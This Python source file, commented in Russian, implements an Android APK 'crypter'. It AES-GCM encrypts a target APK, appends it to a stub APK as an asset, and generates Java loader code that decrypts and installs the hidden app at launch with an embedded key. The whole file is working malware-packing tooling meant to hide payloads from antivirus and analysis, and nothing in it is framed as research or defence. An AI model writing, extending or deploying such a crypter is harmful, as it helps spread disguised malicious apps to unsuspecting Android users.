import os
import secrets
import zipfile
import shutil
from pathlib import Path
from Crypto.Cipher import AES
from services.stub_builder import StubBuilder


class APKCrypter:
    def __init__(self):
        self.temp_dir = Path("temp")
        self.output_dir = Path("output")
        self.temp_dir.mkdir(exist_ok=True)
        self.output_dir.mkdir(exist_ok=True)
        self.aes_key = secrets.token_bytes(32)
        self.stub_builder = StubBuilder()
    
    def encrypt_apk(self, apk_path: str) -> bytes:
        """Шифрует APK через AES-GCM"""
        with open(apk_path, 'rb') as f:
            apk_data = f.read()
        
        nonce = secrets.token_bytes(12)
        cipher = AES.new(self.aes_key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(apk_data)
        
        # Возвращаем nonce + tag + ciphertext
        return nonce + tag + ciphertext
    
    def create_crypted_apk(self, apk_path: str) -> str:
        """Создает зашифрованный APK с автоматической сборкой stub"""
        original_name = Path(apk_path).stem
        
        # Шифруем оригинальный APK
        encrypted_data = self.encrypt_apk(apk_path)
        
        # Собираем stub APK через Android SDK
        stub_apk = self.stub_builder.build_stub_apk(self.aes_key.hex())
        
        # Добавляем зашифрованный payload в stub
        output_apk = self.output_dir / f"{original_name}_crypted.apk"
        shutil.copy(stub_apk, output_apk)
        
        with zipfile.ZipFile(output_apk, 'a', zipfile.ZIP_DEFLATED) as zipf:
            zipf.writestr("assets/payload.bin", encrypted_data)
        
        return str(output_apk)
    
    def generate_loader_code(self) -> str:
        """Генерирует код LoaderActivity для stub"""
        aes_key_hex = self.aes_key.hex()
        
        return f'''package com.loader;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Build;
import androidx.core.content.FileProvider;
import java.io.*;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class LoaderActivity extends Activity {{
    
    private static final byte[] AES_KEY = hexToBytes("{aes_key_hex}");
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        
        new Thread(() -> {{
            try {{
                // Читаем зашифрованный APK из assets
                InputStream is = getAssets().open("payload.bin");
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) {{
                    baos.write(buffer, 0, bytesRead);
                }}
                byte[] encryptedApk = baos.toByteArray();
                is.close();
                
                // Расшифровываем APK
                byte[] decryptedApk = decryptAES(encryptedApk);
                
                // Сохраняем во временный файл
                File tempApk = new File(getCacheDir(), "decrypted.apk");
                FileOutputStream fos = new FileOutputStream(tempApk);
                fos.write(decryptedApk);
                fos.close();
                
                // Устанавливаем APK
                runOnUiThread(() -> installApk(tempApk));
                
            }} catch (Exception e) {{
                e.printStackTrace();
                runOnUiThread(() -> finish());
            }}
        }}).start();
    }}
    
    private byte[] decryptAES(byte[] encrypted) throws Exception {{
        // Извлекаем nonce (12 байт)
        byte[] nonce = new byte[12];
        System.arraycopy(encrypted, 0, nonce, 0, 12);
        
        // Извлекаем tag (16 байт)
        byte[] tag = new byte[16];
        System.arraycopy(encrypted, 12, tag, 0, 16);
        
        // Извлекаем ciphertext
        byte[] ciphertext = new byte[encrypted.length - 28];
        System.arraycopy(encrypted, 28, ciphertext, 0, ciphertext.length);
        
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(128, nonce);
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(AES_KEY, "AES"), spec);
        
        // Объединяем ciphertext и tag
        byte[] input = new byte[ciphertext.length + 16];
        System.arraycopy(ciphertext, 0, input, 0, ciphertext.length);
        System.arraycopy(tag, 0, input, ciphertext.length, 16);
        
        return cipher.doFinal(input);
    }}
    
    private void installApk(File apkFile) {{
        Intent intent = new Intent(Intent.ACTION_VIEW);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {{
            Uri apkUri = FileProvider.getUriForFile(this, 
                getPackageName() + ".fileprovider", apkFile);
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_GRANT_URI_PERMISSION);
        }} else {{
            intent.setDataAndType(Uri.fromFile(apkFile), 
                "application/vnd.android.package-archive");
        }}
        
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        finish();
    }}
    
    private static byte[] hexToBytes(String hex) {{
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {{
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i+1), 16));
        }}
        return data;
    }}
}}'''
